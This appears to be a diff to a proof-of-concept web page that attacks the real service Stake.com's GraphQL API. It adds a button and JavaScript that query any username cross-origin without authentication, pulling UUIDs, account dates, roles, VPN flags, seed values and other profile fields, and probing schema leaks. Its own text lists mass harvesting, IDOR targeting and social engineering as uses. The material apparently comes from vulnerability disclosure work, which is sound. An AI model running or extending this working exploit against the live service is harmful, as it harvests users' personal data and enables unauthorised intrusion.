@@ -51,6 +51,13 @@
     <button class="secondary" onclick="runAuthDataTheft()">4. Extract User Data (needs token)</button>
     <button class="secondary" onclick="runUserEnum()">5. Enumerate User Accounts (10+ users)</button>
 
+    <div style="margin:15px 0;padding:15px;background:#111;border:1px solid #333;border-radius:4px;">
+        <label style="color:#ffaa00;font-weight:bold;">6. Lookup Any User (No Auth Required)</label><br>
+        <input id="userLookup" type="text" placeholder="Enter username (e.g. admin, Drake, stake)" style="width:400px;padding:8px;margin:8px 5px 0 0;background:#0a0a1a;color:#0f0;border:1px solid #444;border-radius:3px;font-family:monospace;font-size:14px;">
+        <button class="secondary" onclick="runUserLookup()" style="vertical-align:middle;">Lookup User</button>
+        <p style="color:#666;font-size:12px;margin-top:5px;">Queries Stake.com GraphQL API cross-origin — returns UUID, creation date, and extended profile fields.</p>
+    </div>
+
     <div id="results"></div>
 
     <script>
@@ -307,6 +314,80 @@ discovered.map(function(f) { return '  - ' + f; }).join('\n') + '\n\n' +
 'Target: ' + API + '\n' +
 'Timestamp: ' + new Date().toISOString());
             });
+        }
+
+        // TEST 6: INTERACTIVE USER LOOKUP
+        function runUserLookup() {
+            var name = document.getElementById('userLookup').value.trim();
+            if (!name) { R.innerHTML = '<p class="warn">Please enter a username to look up.</p>'; return; }
+
+            R.innerHTML = '<h2>USER LOOKUP: "' + name.replace(/</g,'&lt;') + '" <span class="badge badge-crit">CROSS-ORIGIN QUERY</span></h2>';
+            log('<p class="info">Querying Stake.com GraphQL API from ' + window.location.origin + ' — no authentication...</p>');
+
+            // First get basic info
+            gql('{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name createdAt } }').then(function(result) {
+                var user = result.data && result.data.data && result.data.data.user;
+                if (!user) {
+                    finding('USER NOT FOUND: "' + name + '"', '',
+'No account found with username "' + name + '".\n' +
+'This is also an information leak — attacker can confirm which usernames do NOT exist,\n' +
+'enabling targeted registration squatting or brute-force enumeration.');
+                    return Promise.resolve(null);
+                }
+
+                finding('USER FOUND: ' + user.name, 'pii',
+'Username:        ' + user.name + '\n' +
+'UUID:            ' + user.id + '\n' +
+'Account Created: ' + user.createdAt + '\n\n' +
+'Query: { user(name: "' + name + '") { id name createdAt } }\n' +
+'Auth Required:   NONE\n' +
+'Origin:          ' + window.location.origin + '\n' +
+'Timestamp:       ' + new Date().toISOString());
+
+                // Now try extended fields for deeper info
+                log('<h2>Extended Profile Enumeration for "' + user.name + '"</h2>');
+                var extQueries = [
+                    { label: 'Profile Flags & Roles', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name flags { flag } roles { name } } }' },
+                    { label: 'Rakeback Info', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name rakpieback { enabled expiresAt } } }' },
+                    { label: 'Preferences', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name preferenceExist } }' },
+                    { label: 'Registration Info', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name registeredWithVpn isMuted } }' },
+                    { label: 'Active Seed', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name activeServerSeedId activeClientSeed } }' },
+                    { label: 'Social & Stats', q: '{ user(name: "' + name.replace(/"/g, '\\"') + '") { id name cashierBalanceNotify tipCount } }' }
+                ];
+
+                var chain = Promise.resolve();
+                extQueries.forEach(function(eq) {
+                    chain = chain.then(function() {
+                        return gql(eq.q).then(function(r) {
+                            var d = r.data && r.data.data && r.data.data.user;
+                            var errs = r.data && r.data.errors;
+                            if (d) {
+                                var details = Object.keys(d).filter(function(k) { return k !== 'id' && k !== 'name'; })
+                                    .map(function(k) { return '  ' + k + ': ' + JSON.stringify(d[k]); }).join('\n');
+                                if (details) finding(eq.label + ' — DATA RETURNED', 'pii', details);
+                            }
+                            if (errs) {
+                                var msgs = errs.map(function(e) { return e.message; }).join('\n');
+                                if (msgs.indexOf('Did you mean') !== -1) {
+                                    finding(eq.label + ' — SCHEMA LEAKED', 'pii', 'Query: ' + eq.q + '\n\nSuggestions:\n' + msgs);
+                                }
+                            }
+                        }).catch(function() {});
+                    });
+                });
+
+                return chain;
+            }).then(function() {
+                finding('LOOKUP IMPACT', 'pii',
+'ANY username can be queried cross-origin without authentication.\n' +
+'This enables:\n' +
+'  - Mass user enumeration and data harvesting\n' +
+'  - UUID collection for targeted IDOR attacks\n' +
+'  - Account age analysis for social engineering\n' +
+'  - Platform intelligence gathering\n\n' +
+'Attacker Origin: ' + window.location.origin + '\n' +
+'Target: ' + API);
+            }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
         }
 
         // FULL PoC
